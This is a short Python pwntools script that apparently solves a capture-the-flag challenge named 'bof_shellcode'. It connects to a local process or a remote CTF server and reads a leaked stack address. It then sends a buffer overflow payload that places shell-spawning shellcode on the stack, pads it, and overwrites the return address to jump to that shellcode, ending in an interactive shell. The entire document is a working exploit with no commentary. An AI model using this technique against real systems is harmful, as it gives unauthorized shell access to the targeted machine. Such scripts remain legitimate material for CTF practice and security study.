from pwn import *

exe = ELF("./bof_shellcode")

context.binary = exe
context.log_level = "DEBUG"

if args.REMOTE:
    p = remote("ctf.cybr.club", 7003)
else:
    p = process()

s = p.recvline().split()[-1]
print(s)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode + b'A'*(128-len(shellcode) + 8) + p64(int(s,16)))
p.interactive()
print(p.recvall())
